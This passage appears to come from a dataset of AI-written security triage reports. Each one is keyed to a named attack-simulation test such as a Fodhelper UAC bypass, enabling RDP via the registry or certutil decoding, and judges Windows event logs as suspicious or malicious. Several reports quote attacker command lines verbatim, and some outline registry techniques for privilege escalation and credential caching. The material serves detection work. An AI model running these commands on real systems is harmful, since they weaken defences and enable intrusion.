   - A correlation with the PowerShell event where `WSReset.exe` was called in a hidden window, stemming from the PowerShell script's action.
   - Observed execution of default Windows binaries like `whoami.exe` and `hostname.exe` which resonate with reconnaissance behaviors.

4. **Application Logs:**
   - Windows Defender was active during the analyzed period, suggesting no immediate disabling of defensive measures, which is often an initial step for persistent threats.

### Findings:
The execution of PowerShell scripts to modify registry values for application execution and starting processes in a hidden window is a strong indicator of suspicious activity. Specifically, setting up the registry to start command prompt instances could be used for privilege escalation or persistent access. The observed execution of `wsreset.exe` in this hidden manner, especially without an apparent legitimate task linked, further supports potential illicit activity.

**Assessment of Situation:**
- The activities observed, such as registry manipulation via PowerShell, process execution in hidden windows, usage of elevated privileges, and execution of default Windows binaries for potential reconnaissance, are consistent with suspicious or potentially malicious behavior. While there's no definitive sign of data exfiltration or specific malware execution yet, the evidence strongly supports that these actions are non-standard, and such tactics often align with malicious intents.

**Resolution:**
- **SUSPICIOUS** - Given the patterns and the specific actions observed in the logs, there's enough justification to flag this behavior as suspicious, necessitating further investigation. It's crucial to ascertain the source of these actions, verify legitimacy of script execution, review user activities around this timeframe, and if needed, engage with security tools like EDR for deeper file/path analysis and cross-check with threat intelligence databases.

**Guidance on How to Proceed:**
- Immediate:
  - Quarantine the affected account and any similar activity accounts to prevent further potential exploits.
  - Analyze user `admin_test` activities more comprehensively, focusing on sessions and command history.
  - Validate the scripts and changes on the affected system for legitimate/authorized use.
  - Consider deploying enhanced monitoring or EDR solutions on the host for real-time threat detection.

- Follow-up:
  - Conduct a thorough review of similar patterns in other systems or accounts to identify any lateral movements.
  - Engage with IT/support teams to corroborate if any authorized changes or scripts are deployed during this period.
  - Based on findings, update security policies and response protocols to include scenarios observed here, ensuring future resilience."
Regsvcs Uninstall Method Call Test,"Upon reviewing the provided logs, several indicators of potentially suspicious and possibly malicious behavior are observed. Here's an in-depth analysis:

1. **Unauthorized Compilation and Registration**:
   - The PowerShell logs show suspicious activity involving the execution of a PowerShell script that decodes a base64 encoded payload. It appears a key is decoded and saved to a temporary file `key.snk`, and then this key is used to compile a new DLL `data.009.dll` using the C# compiler (`csc.exe`). This compiled DLL is later registered using `regsvcs.exe`. This behavior is characteristic of generating and registering a malicious component on a system.

2. **Process Execution and Chain**:
   - Within the Sysmon logs, repeated execution of PowerShell and command-line utilities like `csc.exe` and `regsvcs.exe` by a user identified as `admin_test` suggests a potentially unauthorized activity.
   - The logging of processes such as `wevtutil.exe` and `conhost.exe` multiple times in quick succession by `admin_test` raises flags, as `wevtutil.exe` can be used to manipulate system logs, potentially as part of a stealth effort by an attacker.

3. **Privileges and Logs**:
   - There are multiple high-integrity processes running under `NT AUTHORITY\SYSTEM`. The events within the security logs involving various high-level privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.) being used are consistent with activities leveraged to execute processes with escalated privileges, indicating privilege escalation efforts.

4. **Credential Stealing Attempts**:
   - Security logs show events (EventID 5379) where there are multiple failed credential reading attempts against a service account `MicrosoftAccount:user=02txoixylodcstop`. The return code indicates failure, yet repeated attempts hint at possible attempts to access credential information.

5. **Network-Based Operations**:
   - Although most operations seem local, the presence of `MicrosoftAccount` and attempts to read credentials suggest attempts were possibly made to leverage network or cloud-based services which could account for lateral movement efforts.

Given these observations, the activity in the logs points towards potentially malicious behavior. The usage of PowerShell with encoded payloads to compile and register DLLs, combined with attempts to hide/conceal these actions through process manipulations and the evidence of privilege escalation, are significant indicators of a compromise.

## Assessment and Recommendations:

### Resolution: MALICIOUS
The activities are consistent with known attack tactics such as fileless malware execution, DLL hijacking, and privilege escalation which are reflective of advanced persistent threat (APT) type behaviors. Immediate action should be taken to investigate and contain the incident.

### Actionable Steps:
1. **Immediate Isolation**: Isolate the system `Server002` to prevent further malicious communication or data exfiltration.
2. **Conduct Detailed Incident Analysis**: Perform a thorough investigation including memory analysis to determine the full scope of the intrusion.
3. **Audit and Review Access**: Evaluate all privileged accounts and ensure no additional unauthorized access has been granted. Conduct password resets on potentially compromised accounts.
4. **Log and Monitor**: Enhance logging policies and enable continuous monitoring, specifically focusing on PowerShell script execution and any abnormal process behavior.
5. **Apply Security Patches and Updates**: Ensure that all security patches are applied to avoid exploitation through vulnerabilities.
6. **End-user Training**: Educate users on identifying phishing attempts and proper use of credentials to prevent further escalations. 

These steps should mitigate the current threat and help protect against future occurrences of similar intrusions."
Rundll32 with desk.cpl,"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided logs from the Windows machine, several noteworthy activities and patterns are identified that suggest potential indicators of compromise:

1. **Suspicious use of Command Prompt:**
   - The Sysmon log entries indicate that a command was executed to copy `calc.exe` to `not_an_scr.scr` and then run it using `rundll32.exe` to install it as a screensaver (`cmd.exe` /c copy %windir%\System32\calc.exe not_an_scr.scr & rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr). This behavior is typically associated with execution of an unauthorized or malicious program disguised as a legitimate screensaver.
   - The creation and execution of `not_an_scr.scr` as shown in the logs suggest an attempt to run malicious code. The use of tools like `cmd.exe` and `rundll32.exe` in this manner is a common technique employed by attackers to execute malicious payloads.

2. **Unusual Privilege Usage:**
   - Several log entries (Event ID 4672) show privilege escalation attempts by the user `admin_test`. The privileges granted include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`, which can be used to gain further control over the system or manipulate system components, indicating a potential compromise by this user account.

3. **Execution of System Utilities by Non-System Accounts:**
   - The Sysmon logs show commands like `whoami.exe` and `hostname.exe` executed by `admin_test`. While these utilities are generally benign, the unusual context and timing of these executions in conjunction with other logs may indicate reconnaissance attempts by a potentially compromised user account.

4. **Anomalous Process Creation:**
   - The repeated use of `wevtutil.exe` and `conhost.exe` by the `admin_test` user in a short timespan suggests the potential for log manipulation or process masquerading attempts, which is a common tactic in post-exploitation activities.

5. **Network Access and Logon Patterns:**
   - There are multiple logon events (Event ID 4624) from the user `admin_test` with NTLM authentication from `DESKTOP-3HL5B2P` to `SERVER002`. The IP address `fe80::e3b5:5371:12a8:9c77` suggests this might be internal but requires further validation against known and expected network patterns.
   - The logins are of type 3, indicating a network logon. These activities need further investigation to ensure they align with normal user behavior.

**Assessment:**
- **SUSPICIOUS:** The log entries contain activities that warrant further investigation. The suspicious command execution, potential privilege escalation, and unusual process and network activities suggest a potential security incident. Although conclusive evidence of compromise is not present, the risk factors necessitate deeper examination.

**Guidance and Next Steps:**
- **Immediate Review of User Accounts:** Investigate the `admin_test` user account to determine if it has been compromised. Check for any unusual activities outside of these logs.
- **Isolation and Monitoring:** Consider isolating the affected system (Server002) from the rest of the network for further investigation and monitoring for any continued suspicious activity.
- **Internal Network Traffic Analysis:** Review internal network traffic, particularly to and from the IP address mentioned. Validate if the source machine `DESKTOP-3HL5B2P` and the account `admin_test` are legitimate or require further scrutiny.
- **Forensic Investigation:** Perform a deeper forensic analysis on `Server002` to understand the full scope of activities and look for any persistence mechanisms or additional payloads.
- **Discussions and Incident Reporting:** Report these findings to the incident response team and management. Initiate a full incident response process if investigation uncovers further signs of compromise.

**Resolution:** **SUSPICIOUS** - Further investigation required to rule out potential compromise."
Enable RDP via Registry (fDenyTSConnections),"Upon reviewing the provided Windows event logs, I've detected several events that merit attention:

1. **System Time Change**:
   - There are multiple entries related to system time changes (`EventID: 1` from `Microsoft-Windows-Kernel-General` and `EventID: 4616` from `Microsoft-Windows-Security-Auditing`). System time was adjusted from a future timestamp to a slightly earlier one. Frequent and unexpected time changes can indicate attempts to evade detection or align timestamps for malicious activity, although it can sometimes be the result of legitimate system activities or misconfigurations.

2. **Remote Desktop Configuration**:
   - An `EventID: 1` from Sysmon logs shows a process creation for `cmd.exe` running a command to change the setting `fDenyTSConnections` to `0` in the registry. This command enables Remote Desktop Protocol (RDP) connections, which could potentially indicate unauthorized configuration changes to permit remote access, especially if it wasn't performed by an authorized administrator.

```plaintext
""C:\\Windows\\System32\\cmd.exe"" /c reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

3. **High Privileged Logons**:
   - There are multiple logon occurrences (`EventID: 4624`) and privilege enumeration events (`EventID: 4672`) using `SYSTEM` account, which could be standard depending on the server's role. However, without context or additional correlation, frequent high-level access could mask privilege escalation or misuse.

4. **Frequent Execution of System Utilities**:
   - Frequent executions of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` as per Sysmon logs under `admin_test` user and high integrity level could signal either an administrator actively performing maintenance or an attacker leveraging these tools to gather information or execute further payloads.

5. **Edge Software Updates**:
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` can be seen frequently starting and stopping. While these could be legitimate update activities, they could also be leveraged by attackers to mask unwanted processes, particularly when running from temporary directories.

**Assessment**:
- **Suspicious Activities Detected**: The alteration of the system registry to enable RDP connections and the unexpected system time changes suggest potentially unauthorized or suspicious activity. However, without additional context or an account of authorized maintenance activities, it's difficult to conclusively declare these activities as malicious without further investigation.

**Resolution**:
- **SUSPICIOUS**: It's advisable to further investigate these logs with specific focus on:
  - Verifying the actions of `admin_test` user to ensure they align with expected behavior.
  - Assessing the legitimacy and authorization of the time changes.
  - Evaluating any potential unauthorized RDP access especially after the registry modification.
  
Further steps should include verifying with system administrators about any planned maintenance activities, checking for any signs of data exfiltration, and possibly reviewing network logs for unauthorized connections during the period of these log events."
Indirect Command Execution - forfiles.exe,"Based on the analysis of the provided logs, several observations can be made:

1. **Windows Defender Activity**:
   - Windows Defender is reported as active in multiple log entries. This suggests that antivirus protection is enabled on the machine.

2. **Process Creation and Execution**:
   - Multiple legitimate system processes are executed, such as `wevtutil.exe`, `conhost.exe`, `wuauclt.exe`, and `taskhostw.exe`, among others. These are standard Windows processes related to event logging, console host, update services, and task handling, respectively.
   - There is a series of entries for the execution of `MicrosoftEdgeUpdate.exe` in various contexts, including updates and service calls. This could indicate routine updates for Microsoft Edge.
   - However, suspicious process execution includes `whoami.exe` and `cmd.exe` with commands meant to launch `calc.exe` using `forfiles`, which is not standard behavior and could be indicative of lateral movement or a script execution attempt.

3. **Security Event Logs**:
   - Multiple successful logon events for the `SYSTEM` account suggest system-level tasks or scheduled tasks being executed. There is no evidence of privilege escalation or unauthorized logons.
   - Event 4672 indicates that special privileges were assigned to the `SYSTEM` account, which is typical for system tasks given its nature.

4. **Command-Line Invocation**:
   - The command line `""cmd.exe"" /c forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe` raises a concern. This specified command appears to scan for `notepad.exe` and then execute `calc.exe`, which is unusual and suggests a possible anomaly or an attempted exploitation or attack strategy.

5. **Time Skew**:
   - There were some timezone adjustments and time syncs with `time.windows.com`. This appears routine for time synchronization and not directly related to suspicious activity.

6. **Network and User Activity**:
   - The lack of logs indicating unauthorized or failed access attempts to accounts or sensitive data further solidifies the case against ongoing lateral movement via user authentication.

7. **Edge Update Activity**:
   - Regular activity from `Microsoft Edge Update` processes is expected, suggesting possible legitimate updates. However, the volume or frequency could be unusual if not typical for the environment.

**Assessment and Resolution**:
- **SUSPICIOUS**: While most activities logged are benign and indicative of normal system activity, the command involving `cmd.exe` and `forfiles` is not typical administrative activity and could be potentially indicative of a script exploit or misuse. This warrants further investigation to rule out any malicious scripting or abuse of legitimate processes.

**Guidance on Further Actions**:
- Verify the presence of any scheduled tasks or system jobs that might explain the execution of the suspicious command.
- Conduct a comprehensive malware scan to ensure there are no latent threats on the system.
- Review system update and time sync logs for any associated anomalies or abnormalities.
- Investigate the purpose and origin of the `cmd.exe` command execution to clarify its legitimacy."
System Scope COR_PROFILER,"After analyzing the provided Windows event logs, here is a detailed breakdown of suspicious activities and other observations:

### 1. **PowerShell Log Analysis:**
- **Modification of System Environment Variables**: The PowerShell log indicates a script that modifies system environment variables under `HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`. Specifically, the script adds:
  - `COR_ENABLE_PROFILING` set to ""1""
  - `COR_PROFILER` set to a GUID
  - `COR_PROFILER_PATH` set to a specific DLL under a TEMP directory

  **Assessment**: The changes to these environment variables are commonly associated with Profiller-based injections, often used in attacks to manipulate or debug applications. The usage of a DLL in the `AppData\Local\Temp` directory, which is typically a non-standard path for legitimate DLLs, is particularly suspicious. This could suggest attempts at executing unauthorized code or malware.

### 2. **Sysmon Log Analysis:**
- **Frequent Execution of PowerShell**: The logs show multiple instances of PowerShell executions. While PowerShell is a legitimate tool, its misuse is common in various attacks, such as fileless malware attacks.
  
- **Use of System Utilities**: The logs also show the execution of `wevtutil.exe` and `whoami.exe`. While these commands may be benign or part of administrative tasks, their context (following potentially suspicious PowerShell activity) raises concern. Specifically, `wevtutil` could be used to clear or manage logs to potentially cover tracks.

### 3. **Edge Update Logs:**
- **Frequent Invocation**: The logs indicate the frequent invocation of Microsoft Edge Update processes, including the setup executables. Although software updates can be expected, the pattern and frequency, especially in a controlled timeframe, might be peculiar. This could either be legitimate updates or indicative of an attack vector exploiting software updating mechanisms.

### Conclusion:
Given the PowerShell activities involving setting profiling variables and a DLL from a TEMP path, combined with potentially suspicious Sysmon activities related to process monitoring and system tools, there is a strong indicator of potentially malicious behavior. This pattern suggests possible attempts to perform unauthorized or malicious actions on the system.

### Resolution:
**MALICIOUS** - The logs contain activities that strongly suggest a compromise or malicious behavior due to the nature of executed PowerShell scripts and the profiler DLLs being set up. Further immediate investigation into the affected system, examination of the suspicious DLL, and network logs should be prioritized, along with containment steps such as isolating the system. Regular security measures like updating antivirus definitions and security patches should also be enforced.
"
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"Upon analyzing the provided Windows event logs across multiple channels including PowerShell, System, Application, Sysmon, and Security logs, I have compiled the following findings:

### PowerShell Log Analysis:
- **PowerShell Command**: The activity shows a PowerShell command executing an `Invoke-CimMethod` to install an MSI package from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi`). The use of user directory and temp folders, combined with PowerShell scripting, is a common tactic for malware delivery and installation.
  
### System Log Analysis:
- The system log shows regular system activities such as time changes by system processes (`svchost.exe`), which usually signify normal operations unless associated with malicious applications.

### Application Log Analysis:
- **MSI Installation**: There are MsiInstaller events referencing the same path and executable (`data.007_JScript.msi`) from the temp directory. The execution is attributed to user `ADMIN_~1`, which indicates an administrative user account.
- **Security Product State**: Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), suggesting there may be some level of endpoint protection active at the moment.

### Sysmon Log Analysis:
- **PowerShell Execution**: Multiple instances of `powershell.exe` showing the same suspicious execution from the temp directory.
- **WMI Provider Host Invocation**: `WmiPrvSE.exe` is seen executing from within the system context which aligns with CIM operations.
- **Various System Utilities**: Execution of common Windows utilities (`whoami.exe`, `hostname.exe`) seemingly initiated by the same user seems okay, but their timing in line with suspicious MSI execution raises a flag.

### Security Log Analysis:
- The security log shows time adjustments linked to `svchost.exe`, executed by the system. This behavior is typically benign unless otherwise contextualized with malicious activities elsewhere, such as unauthorized time changes for persistence attempts.

### Summary:
The repeated invocation of PowerShell to execute a script from a temporary directory along with WMI methods suggests a conscious effort to execute potentially unauthorized software installations. The logs consistently show activities tied to paths typically indicative of malware execution (temporary folders), and PowerShell, applied in a seemingly automated manner. 

### Assessment & Resolution:
- **Activity Type**: SUSPICIOUS. 
- **Reasoning**: Execution from a temporary directory is commonly associated with malicious activity. The use of PowerShell to execute commands from this location further compounds this suspicion.
  
### Recommendations:
1. **Further Investigation**: Conduct a deeper forensic analysis of the involved binaries, hashes mentioned in the logs, and network activity around the time of these events to determine the nature and intent of the installed application(s).
2. **User Account Monitoring**: Ensure the administrative account (`admin_test`) hasn't been compromised and review any other related accounts for unauthorized changes.
3. **Review MSI File**: Evaluate the MSI package (`data.007_JScript.msi`) by submitting it to a threat intelligence platform or conducting static/dynamic analysis to confirm its intent.
4. **Endpoint Security**: Analyze endpoint protection logs for any detection/preventative measures around the time of these events, ensuring system defenses are updated.

These steps should confirm whether the observed activities are indeed part of an unauthorized intrusion or otherwise benign operations."
Use Powershell to Modify registry to store logon credentials,"Upon reviewing the provided logs, here is a detailed analysis:

### Analysis

1. **Sysmon Logs:**
   - **Process Creation Events**: Predominantly, these consist of legitimate processes such as `MicrosoftEdgeUpdate.exe`, `MusNotification.exe`, `PowerShell.exe`, etc. The Microsoft Edge Update processes are expected due to scheduled updates.
   - **PowerShell Execution**: The noteworthy event is a PowerShell command altering the registry to set 'WDigest UseLogonCredential' to 1. This setting in the Windows registry could potentially allow for credential theft since WDigest authentication can store credentials in memory, which is considered risky and is generally disabled by default in modern systems for security reasons.
   
2. **PowerShell Logs:**
   - These logs corroborate the alteration to the WDigest registry setting. The command executed modifies the registry key `HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`, enabling the `UseLogonCredential` option, which is typically a recognized indication of credential dumping attempts.

3. **Other Logs (System, Application, Security):**
   - **Time Change**: The logs showed slight, but legitimate time adjustments potentially related to synchronization with `time.windows.com`.
   - **Security Logs**: Show the SYSTEM user with elevated privileges, which is typical but notable in the context of the PowerShell command. There is nothing apparently malicious in processes or actions logged aside from the WDigest key modification.

### Assessment
- The primary concern in the logs is the execution of a PowerShell command that modifies the WDigest registry setting. This behavior can indicate preparation for credential dumping or another form of attack that compromises credential security.
- Regular updates for Microsoft Edge and Windows Services and other benign processes were observed, which do not raise security concerns.

### Conclusion
Given the potentially hazardous impact of enabling WDigest's `UseLogonCredential`, this activity is categorized as suspicious. While this action alone is not definitively malicious, it necessitates further investigation to determine if it is part of a legitimate administrative action or a precursor to an attack.

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed
1. **Investigate the Origin**: Determine who or what initiated the PowerShell command to change the WDigest settings. Check for any anomalies in user activities or origins of remote connections.
2. **Review Change Logs**: If possible, examine change logs or systems management activities for legitimate justification of this registry change.
3. **Monitor Systems More Intensely**: Look for any further signs of credential access attempts, particularly activities targeting the LSASS process.
4. **Revert Changes**: If this registry change is determined to be unauthorized, revert it immediately and ensure that WDigest remains disabled unless absolutely required.
5. **Enhance System Monitoring**: Implement or enhance monitoring and alerting for changes to security-related registry settings and suspicious PowerShell activity.

By addressing these aspects, you'll ensure that potential security risks are mitigated while understanding if this activity is benign or part of a more significant security threat."
Deobfuscate-Decode Files Or Information,"Upon analyzing the provided Windows event logs from the machine named ""Server002"", the following points stand out:

1. **Security Log Events:**
   - **Event ID 4624 (An account was successfully logged on)** and **Event ID 4672 (Special privileges assigned to new logon)** are logged for the user `admin_test` from the IP address `192.168.0.102`. The special privileges include `SeDebugPrivilege`, which allows the user to debug programs, a common activity associated with advanced usage or potential malicious activity.
   - **Event ID 4634 (An account was logged off)** shows that the `admin_test` user logged off. 

2. **Sysmon Log Events:**
   - The `admin_test` user executed several processes, including `wevtutil.exe` and `conhost.exe`, which are system utilities. Wevtutil is often used to query, modify, or clear event logs, which can be benign but is also an activity often used to cover tracks in a compromised system.
   - A particularly concerning command is seen with `cmd.exe /c certutil -encode C:\Windows\System32\calc.exe %temp%\data_calc.txt & certutil -decode %temp%\data_calc.txt %temp%\data_calc_decoded.exe`. The use of `certutil` to encode and decode files is a known technique for file obfuscation or malware delivery.
   - The process image `whoami.exe` was executed to check the identity of the logged-in user, which might indicate suspicious reconnaissance activities.

3. **Additional Observations:**
   - Use of `cmd.exe` to execute commands like encoding and decoding files using `certutil` raises further suspicion. Certutil is a utility used for certificate services, but when used to encode and decode files, it can be an indication of file manipulation or obfuscation techniques often employed by attackers.
   - There is a high frequency of process creation involving system utilities and these are executed under high integrity level, which could indicate exploitation of privileges.

**Assessment:**
The combination of privileged access by the `admin_test` account, the use of potentially obfuscating techniques using `certutil`, and multiple executions of command-line utilities indicate that these logs contain **suspicious activity**.

**Recommendation:**
1. Conduct a thorough review of the `admin_test` user account activities and verify whether they align with expected and authorized usage.
2. Investigate the reason for encoding and decoding operations performed using `certutil`, and check for any encoded payloads.
3. Verify if the IP address `192.168.0.102` is recognized and authorized for admin activities on ""Server002"".
4. Review any network activity from this server around the time of these events to identify potential data exfiltration or command-and-control communications.
5. Consider isolating the affected system until a comprehensive forensic investigation is completed.

**Resolution: SUSPICIOUS - Further investigation is needed due to potential indicators of compromise.**"
Lolbas ie4uinit.exe use as proxy,"Upon reviewing the provided logs, here is a detailed analysis:

### Observations

1. **Execution of PowerShell and Conhost:**
   - We see multiple instances where PowerShell (`powershell.exe`) and `conhost.exe` are running, initiated by the user SERVER002\admin_test. This could be routine, but PowerShell is often used in malicious activities for executing scripts silently.
   
2. **WevtUtil Usage:**
   - The process `wevtutil.exe` appears several times. `Wevtutil` is commonly used to manage event logs, which can include clearing log data. This action, if unauthorized, could indicate attempts to cover tracks.

3. **Suspicious Command Executions:**
   - An instance of `cmd.exe` was run with parameters to copy `ie4uinit.exe` to a temporary location and execute it. This could point to executing unverified code or an attempt to bypass software restrictions (EventRecordID 17994). The `ie4uinit.exe` being run from a temporary directory is especially notable.

4. **Use of Rundll32:**
   - Multiple executions of `rundll32.exe` suggest plugin management, which could be benign. However, `rundll32` is often used in a malicious context to execute DLLs.

5. **Windows Health and Security Processes:**
   - Processes like `SecurityHealthService.exe` and `wermgr.exe` are running. These are typical for maintaining system health and reporting errors.

6. **Event 4798 (Security Accounts):**
   - This event type shows querying information about several user accounts, which could relate to enumeration activities.

7. **Privileged Operations:**
   - Event 4672 outlines that privileged accounts are being utilized, which indicates operations that require elevated permissions.

8. **Multiple Entries in MicrosoftEdgeUpdate.exe:**
   - Recurring entries relate to Edge updates, which appear consistent with update mechanisms.

### Assessment
The activities involving PowerShell, `ie4uinit.exe` execution from temporary directories, and `wevtutil` usage are particularly concerning in the context of potential malicious behavior. These could be indicators of an attacker attempting to execute payloads, modify system states, or cover their tracks.

### Resolution
Taking into account the number of suspicious activities, the analysis flags these logs as:

- **SUSPICIOUS**: While conclusive evidence of a compromise isn't immediately evident, the usage patterns of critical system utilities and the command actions suggest that a more detailed investigation is warranted. Monitoring for any further malicious indicators or any persistence mechanisms should be prioritized.

**Guidance on Proceeding:** 
1. Ensure all patch levels on the system are up-to-date.
2. Employ deeper forensic analysis on the temporary files created and any associated network activity.
3. Review the precise command parameters used in executing PowerShell and any scripts executed.
4. Cross-reference processes with known Indicators of Compromise (IoCs).
5. Increase monitoring on the user's activity (SERVER002\admin_test), particularly if this account does not require administrative access according to its role."
Odbcconf.exe - Execute Arbitrary DLL,"Based on the Windows event logs provided, the following analysis is derived:

### Analysis:
- **PowerShell Activity:**
  The logs provided do not contain PowerShell event entries.

- **Sysmon Activity:**
  - Observations indicate frequent execution of PowerShell (as `powershell.exe`), `wevtutil.exe`, `whoami.exe`, and various `conhost.exe` processes under the user `SERVER002\admin_test`.
  - The execution paths for many of these processes are within `C:\Windows\System32\`, which is standard; however, frequent spawning of conhost.exe and cmd.exe in short intervals and proximity to administrative tasks (e.g., `cmd.exe` invoking `odbcconf.exe` with registration of a .dll) could signify script or automated task activity.
  - **Suspicious Activity:** A notably suspicious command execution is detected with `cmd.exe` via `odbcconf.exe` aiming to register `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.008\src\Win32\data.dll`. This could indicate potential DLL injection or malicious DLL usage.
  - **Edge Update Activity:** Numerous entries reflect activities related to Microsoft Edge Update. These include automatic updates or tasks performed by Microsoft Edge services, generally benign but often monitored for anomalies.
  
- **Application Activity:**
  The events within the Application log primarily involve routine activities such as security product status reports for Windows Defender and Microsoft Edge updates. The Edge Update logs show services stopping, which might be part of a normal update cycle.

- **Security Activity:**
  No specific security log entries are present for this period, which could be expected unless unusual or abnormal user actions were logged to security events actively.

### Assessment:
The series of logs present typical system operations involving administrative tasks and automated software updates (Microsoft Edge). However, the use of a command involving DLL registration within a temporary path stands out and raises concern.

#### Conclusion:
- The activity involving the registration of a DLL through `odbcconf.exe`, especially when residing in a temporary directory, necessitates further investigation. This could be indicative of potential malicious behavior, such as preparing a system for exploitation or persistence through DLL injection.

### Resolution:
- **SUSPICIOUS:** The behavior captured involving DLL registration suggests the need for further examination beyond the logs provided. Investigate the origin and integrity of the DLL file being registered and determine if this aligns with known software operations or originates from legitimate administrative tasks.

### Guidance:
1. Conduct a thorough analysis of the DLL file referenced in the suspicious `odbcconf.exe` invocation.
2. Review recent changes or installations that relate to this activity to understand intent and legitimacy.
3. Check for similar patterns within the broader network environment to identify potential proliferation.
4. Consider isolating the host for a comprehensive forensic investigation to prevent any potential risk of malicious activity."
HTML Smuggling Remote Payload,"Based on the detailed analysis of the provided Windows event logs, the following key findings are noted:

1. **Windows Defender Status**:
   - The Application log entries show Windows Defender is actively running and enabled on the system, indicating a baseline of system security.

2. **Security Logs and Credential Logs**:
   - The Security log reveals multiple Event ID 5379 entries indicating credential validation attempts.
   - These logs show attempts to read credentials related to a ""MicrosoftAccount:user=02txoixylodcstop"" with a ReturnCode of ""3221226021"", which indicates a failed attempt due to a logon failure or invalid credentials. Although this doesn't directly indicate malicious activity, such repeated attempts can sometimes be indicative of unauthorized access attempts.

3. **Sysmon Logs**:
   - A variety of processes are executed, typical of regular system operations:
     - Multiple instances of `msedge.exe`, `conhost.exe`, and various related processes seem to be running under an administrator account ""admin_test"", which can be normal if a browser or utilities were actively used during this time.
     - Processes like `wevtutil.exe` might be unusual if not expected, as they can be used by attackers for log clearing or manipulation.
   - A key observation is the execution of `powershell.exe` with command lines involving paths to temporary directories, indicative of script execution which could be benign but also potentially malicious if unexpected or unauthorized. Specifically, the script running from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\data_006_remote.html` is suspicious, especially since it's being executed via PowerShell.

4. **PowerShell Log**:
   - The PowerShell log captures processes initiated with command lines involving scripts located in temporary directories, which heightens suspicion. Execution from such locations is not always suspicious, but combined with other factors (such as a lack of clarity about what the script does), it warrants further investigation.
   
5. **Edge and Installer Activities**:
   - There are multiple entries indicating the execution and updating of Microsoft Edge showing version transitions and installer executions. While this is typically benign, if unexpected, it could be checked to ensure it's part of normal update cycles.

Based on this analysis, the events indicate:

- There is no irrefutable evidence of overt malicious activity, such as known malware signatures or tools.
- The execution of PowerShell scripts from temporary directories, along with repeated credential verification failures, is anomalous enough to warrant a closer look.

**Resolution**: **SUSPICIOUS** - The activity is suspicious due to unusual PowerShell script execution and repeated credential verification failures, though not conclusively malicious without further context. Further investigation is recommended to understand the nature of the script being run via PowerShell and to verify the legitimacy of the user or process attempting credential access. It is prudent to review user activities around the time of these logs and possibly conduct a deep scan with updated virus definitions."
Bypass UAC using Fodhelper - PowerShell,"After analyzing the provided Windows event logs, here's a breakdown of the findings:

### Security Log Analysis
1. **Event ID 4624** - This event shows a successful logon with Logon Type 5, typically associated with a service logon. The user context is SYSTEM, which is common for system services.
2. **Event ID 4672** - This event indicates special privileges were assigned to SYSTEM, which includes many high-level privileges like SeDebugPrivilege. This is common for SYSTEM processes.

These logs do not immediately indicate malicious activity as SYSTEM commonly holds these privileges and the logon type is typical for service accounts.

### PowerShell Log Analysis
- The PowerShell logs exhibit the execution of a script manipulating the Windows registry to alter the command executed by the ms-settings feature. This is a known method for executing commands with elevated privileges through the FodHelper UAC bypass technique. The command attempts to execute cmd.exe with elevated privileges without prompting UAC.

### Application Log Analysis
- Activities related to Windows Defender are benign and indicate it remains active.
- Service stopped events related to edgeupdate do not indicate suspicious activity on their own but should be monitored for an unusually high frequency.

### Sysmon Log Analysis
1. **PowerShell Execution** - Notably, the process `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` appears with a command line linked to potential privilege escalation using FodHelper.exe.
2. **Execution of Common Windows Utilities** - Processes such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` executed by the user `SERVER002\admin_test` mostly align with some maintenance or monitoring tasks. However, they should be validated against known expected behavior.
3. **Microsoft Edge Update Activities** - Numerous EdgeUpdate activities are detected but they primarily appear to correlate with Edge's functionality. It's worth ensuring the EdgeUpdate process isn't being leveraged for persistence by malware.

### Conclusion
The logs include evidence of a potential privilege escalation attempt through the UAC bypass technique using FodHelper.exe and PowerShell. This raises a significant red flag for malicious activity. 

### Resolution
**Resolution**: MALICIOUS

### Recommendations
1. **Immediate Containment**: Disable potential misuse of the ms-settings handler by removing unauthorized registry keys.
2. **Further Investigation**: Identify any other unknown changes in registry keys or unexpected system behavior.
3. **System Scanning**: Perform a comprehensive malware scan using updated antivirus solutions targeting scripts and potential privilege escalation vectors.
4. **Enhance Monitoring**: Implement more extensive logging on PowerShell and registry changes for early detection.
5. **User Education**: Educate users on avoiding activities that could lead to social engineering attacks, which commonly precede such privilege escalation attempts."
Lolbin Jsc.exe compile javascript to exe,"### Detailed Analysis

Upon reviewing the provided logs from the Windows machine `Server002`, several key observations are noted:

#### 1. **System Log Analysis:**
- The system log primarily contains events related to time synchronization changes, specifically changes to the system time, using `svchost.exe`. This `TimeChange` is a benign operation and usually occurs when the system syncs with an NTP server. These changes are recorded by the Time-Service (Event ID: 35).

#### 2. **Security Log Analysis:**
- The security log entries (Event ID: 4616) show time change activities recorded as security events. Each change corresponds with a time change event in the system log and is performed by `svchost.exe` under the `LOCAL SERVICE` account. This activity aligns with regular system operations, given no anomalies or unauthorized access attempts.

#### 3. **Sysmon Log Analysis:**
- A sequence of processes related to `powershell.exe`, `wevtutil.exe`, and `conhost.exe` are observed as executed under the user account `SERVER002\admin_test`.
- A particularly noteworthy entry is the execution of `powershell.exe`, a potent scripting tool that can be leveraged for legitimate administrative tasks but is often used in attacks.
- Multiple executions of `cmd.exe`, `jsc.exe` (JavaScript compiler), and `cvtres.exe` occur, potentially signaling script compilation. The compilation appears to be initiated via an administrative script due to the high integrity level.
- Despite these observations, the commands executed do not exhibit explicitly malicious patterns, such as known malicious flags or arguments commonly used in attacks.

### Threats, Risks, and Guidance
